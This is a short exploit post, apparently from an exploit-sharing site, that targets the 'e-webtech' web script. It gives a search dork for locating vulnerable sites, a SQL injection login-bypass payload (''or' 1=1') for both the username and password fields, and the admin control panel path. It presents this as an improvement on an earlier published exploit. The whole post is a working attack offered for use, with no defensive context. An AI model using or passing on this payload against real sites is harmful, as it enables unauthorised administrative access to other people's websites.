=========================================================

Author: s1ayer
  
Mail: s1ayer.icw@gmail.com
  
Script Name: e-webtech
  
Dork: "Powerd by www.e-webtech.com" or by "e-webtech"
-------------------------------------------------------------------------------------------
  
User Exploit:
'or' 1=1  

Password Exploit:
'or' 1=1 
 
Administartor Panel:
 
http://[sitename]/[path]/controlpanel/

============================================================================

above improvement has been for the paper published in http://inj3ct0r.com/exploits/12203 by CoBRa_21

as some of the sites pwd column name was changed so by the exploit mentioned for the password was not getting executed correctly

or instead of finding the password we can use the code given in the password column....

although admin name was getting successfully executed from the exploit given by CoBRa_21 but with the exploit code of 'or'1=1 admin name 

is not an issue................
